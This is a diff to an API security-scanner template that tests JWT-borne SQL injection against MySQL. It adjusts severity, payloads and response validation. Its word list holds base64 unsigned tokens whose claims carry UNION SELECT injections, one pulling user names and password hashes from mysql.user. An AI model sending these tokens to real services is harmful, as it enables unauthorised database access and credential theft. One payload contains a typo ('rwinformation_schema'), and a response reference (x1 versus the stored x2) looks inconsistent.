@@ -13,7 +13,7 @@ info:
     shortName: Broken Authentication
     displayName: Broken User Authentication (BUA)
   subCategory: JWT_APPEND_SQL_INJECTION_MYSQL
-  severity: HIGH
+  severity: MEDIUM
   tags:
     - Business logic
     - OWASP top 10
@@ -78,49 +78,93 @@ wordLists:
   JWTPayloads:
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCAnaW5qZWN0ZWRfdmFsdWUiLCJyb2xlIjoiYWRtaW4ifQ."
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBOVUxMLCBDT05DQVQodXNlcigpLCAweDNhLCBwYXNzd29yZCkgRlJPTSAgbXlzcWwudXNlci0tIiwicm9sZSI6ImFkbWluIn0."
-    - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBOVUxMLCBDT05DQVQodXNlcigpLCAweDNhLCBwYXNzd29yZCkgRlJPTSAgbXlzcWwudXNlci0tIiwicm9sZSI6ImFkbWluIn0."
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCB0YWJsZV9uYW1lIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcy0tIiwicm9sZSI6ImFkbWluIn0."
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBjb2x1bW5fbmFtZSBGUk9NIHJ3aW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfbmFtZSA9ICd1c2Vycy0tIiwicm9sZSI6ImFkbWluIn0."
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCB2ZXJzaW9uKCktLSIsInJvbGUiOiJhZG1pbiJ9."
     - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCB1c2VyKCktLSIsInJvbGUiOiJhZG1pbiJ9."
+  negativeJWTPayloads:
+    - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9."
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_header:
         headerKey: "Bearer ${JWTPayloads}"
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_header:
+        headerKey: "Bearer ${negativeJWTPayloads}" 
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          neq: "${x1.response.body}"
+          not_contains:
+            - rate-limit
+            - rate limit
+            - rate_limit
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts          
+    - success: vulnerable
